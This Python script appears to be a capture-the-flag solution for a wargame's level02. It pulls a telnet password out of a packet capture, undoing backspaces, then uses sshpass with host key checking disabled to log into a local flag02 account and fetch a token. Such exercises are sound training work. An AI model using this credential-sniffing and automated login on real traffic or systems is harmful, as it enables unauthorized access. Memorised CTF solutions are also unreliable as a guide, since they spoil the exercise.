"""
Level02 - PCAP Network Traffic Analyzer with SSH

Objective:
    Extract password from PCAP file and use it to access flag02 account.

Vulnerability:
    Plain-text telnet session captured in PCAP reveals login credentials.

Usage:
    python3 exploit.py
"""

import os
import subprocess
import sys

try:
    import dpkt
except ImportError:
    print("[-] dpkt required: pip install dpkt")
    sys.exit(1)


# ============================================================================
# Helper Functions
# ============================================================================

def parse_pcap(pcap_file):
    """Parse PCAP and extract TCP payloads."""
    packets = []
    with open(pcap_file, 'rb') as f:
        for ts, buf in dpkt.pcap.Reader(f):
            try:
                eth = dpkt.ethernet.Ethernet(buf)
                if isinstance(eth.data, dpkt.ip.IP) and isinstance(eth.data.data, dpkt.tcp.TCP):
                    if eth.data.data.data:
                        packets.append(eth.data.data.data)
            except:
                continue
    return packets


def extract_password(payloads):
    """Extract password from telnet session, handling backspace characters."""
    stream = b''.join(payloads)
    clean = bytearray()
    i = 0
    while i < len(stream):
        if stream[i] == 0xff and i + 1 < len(stream):
            i += 2
        else:
            clean.append(stream[i])
            i += 1

    text = []
    for byte in clean:
        if byte == 0x7f and text:
            text.pop()
        elif 0x20 <= byte < 0x7f:
            text.append(chr(byte))
        elif byte in (0x0a, 0x0d) and text:
            text.append('\n')
    return ''.join(text)


def ssh_cmd(host, port, user, pwd, cmd):
    """Execute SSH command."""
    try:
        result = subprocess.run(
            ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
             "-p", str(port), f"{user}@{host}", cmd],
            capture_output=True, text=True, timeout=10
        )
        return result.returncode, result.stdout
    except:
        return -1, ""


# ============================================================================
# Exploitation
# ============================================================================

def exploit():
    """Extract password from PCAP and retrieve token."""
    pcap_file = os.path.join(os.path.dirname(__file__), 'level02.pcap')
    print("[*] Level02 PCAP Extractor\n")
    print(f"    Analyzing: {pcap_file}\n")

    try:
        payloads = parse_pcap(pcap_file)
        result = extract_password(payloads)
        password = next((line.split('Password:')[-1].strip() for line in result.split('\n')
                        if 'Password:' in line), None)

        if not password:
            print("[-] Password not found")
            return False, "", ""

        print(f"[+] Extracted: {password}")
        print(f"[*] Connecting to flag02@localhost:4242")
        code, out = ssh_cmd("localhost", 4242, "flag02", password, "getflag")
        if code == 0 and "token" in out.lower():
            print(f"[+] Success!\n{out}")
            token = out.split(":")[-1].strip()
            return True, token, password
        else:
            print("[!] Failed")
            return False, "", ""
    except Exception as e:
        print(f"[-] Error: {e}")
        return False, "", ""


# ============================================================================
# Main
# ============================================================================

def main():
    success, token, password = exploit()

    if success:
        print("\n[SUMMARY]")
        print(f"  Vulnerability: Plain-text telnet session in PCAP")
        print(f"  Attack: Extracted password from network capture")
        print(f"  Result: Accessed flag02 account\n")
        print(f"[ANSWER]")
        print(f"  Flag02 Password: {password}")
        print(f"  Level02 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
